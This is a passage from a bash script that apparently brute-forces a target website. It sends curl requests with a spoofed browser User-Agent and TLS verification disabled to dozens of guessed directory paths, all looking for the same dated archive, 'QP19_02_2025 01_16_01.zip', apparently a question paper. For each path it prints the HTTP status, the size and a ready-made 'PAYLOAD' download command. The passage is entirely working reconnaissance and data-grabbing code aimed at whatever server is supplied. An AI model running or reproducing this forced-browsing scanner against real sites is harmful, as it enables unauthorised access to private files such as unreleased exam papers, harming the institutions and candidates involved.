${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper-AccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper-AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper-AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader-QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB-AutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB-AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB-AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync_QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring_QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagerQPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagerQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagerQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite-QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUploadQPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUploadQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUploadQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploadDataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploadDataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploadDataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloudPortal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloudPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloudPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer-QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControlQPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControlQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControlQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlerQPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlerQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlerQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdminDataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdminDataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdminDataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulkMonitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkMonitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkMonitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystem_QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystem_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystem_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystemQsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystemQsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystemQsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlerQP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlerQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlerQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler_Sync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch_Sync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingQPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper_Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploaderAutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploaderAutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploaderAutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmtControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmtControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmtControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingQPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase_Ops/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase_Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase_Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module-QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP_Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingTestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuiteQPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuiteQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuiteQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload_QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_PModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_PModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_PModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing-DataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing-DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing-DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing-Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper-BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase_MonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
